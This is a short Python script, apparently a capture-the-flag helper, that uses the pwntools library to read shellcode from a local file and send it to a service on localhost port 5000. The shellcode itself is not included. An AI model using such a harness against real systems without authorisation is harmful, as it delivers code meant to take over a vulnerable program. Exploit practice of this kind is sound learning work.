from pwn import *

# context.binary = elf = ELF("./elf")


shellcode = open("bin", "rb").read()
p = remote("localhost", 5000)

p.sendline(shellcode)

print(p.clean())
